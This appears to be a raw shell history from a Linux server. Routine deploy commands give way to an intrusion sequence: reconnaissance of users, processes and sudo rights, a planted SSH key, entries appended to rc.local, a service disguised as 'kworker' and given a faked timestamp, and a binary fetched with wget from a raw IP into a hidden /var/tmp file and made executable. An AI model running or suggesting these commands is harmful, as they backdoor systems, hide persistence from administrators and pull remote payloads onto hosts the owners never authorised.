cd app
tail -f /var/log/app/app.log
sudo systemctl restart app
systemctl status app
git pull
ls
make deploy
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
sudo tee -a /etc/rc.local
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIutPeru7JrGIOhO5wX1BrSFVblj95kl2vKXIfVAo+oG ops@build' >> ~/.ssh/authorized_keys
sudo tee -a /etc/systemd/system/kworker.service
touch -r /etc/hostname /etc/systemd/system/kworker.service
wget -q http://91.107.166.76/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
